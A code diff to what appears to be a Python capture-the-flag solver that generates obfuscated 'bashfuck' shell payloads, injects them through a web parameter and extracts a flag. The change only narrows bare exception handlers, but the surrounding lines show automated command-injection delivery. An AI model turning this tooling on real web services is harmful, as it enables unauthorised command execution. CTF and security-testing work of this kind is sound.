@@ -41,7 +41,7 @@ def _http_raw(url, data=None, timeout=8):
             return resp.status, resp.read(), None
     except urllib.error.HTTPError as e:
         try: return e.code, e.read(), None
-        except: return e.code, None, str(e)
+        except Exception: return e.code, None, str(e)
     except Exception as e:
         return None, None, str(e)
 
@@ -50,7 +50,7 @@ def _http_text(url, data=None, timeout=8):
     _, body, _ = _http_raw(url, data, timeout)
     if body is None: return None
     try: return body.decode('utf-8', errors='replace')
-    except: return body.decode('latin-1', errors='replace')
+    except Exception: return body.decode('latin-1', errors='replace')
 
 
 def _extract_flag(text):
@@ -208,7 +208,7 @@ def _find_working_forms(url, param, method):
     for form in ['bit', 'zero', 'c']:
         try:
             payload = bashfuck.bashfuck_payload('echo 0', form)
-        except: continue
+        except Exception: continue
 
         text = sender(url, param, payload)
         if not text: continue
@@ -240,7 +240,7 @@ def bashfuck_solve(url, on_progress=None):
     def _log(stage, item, status):
         if on_progress:
             try: on_progress(stage, item, status)
-            except: pass
+            except Exception: pass
 
     _log('bashFuck', 'fetch', 'Fetching page...')
     source = _http_text(url, timeout=10)
@@ -282,7 +282,7 @@ def bashfuck_solve(url, on_progress=None):
             for cmd_label, cmd in _CMDS:
                 try:
                     payload = bashfuck.bashfuck_payload(cmd, form)
-                except: continue
+                except Exception: continue
 
                 text = sender(url, param, payload)
                 if not text: continue
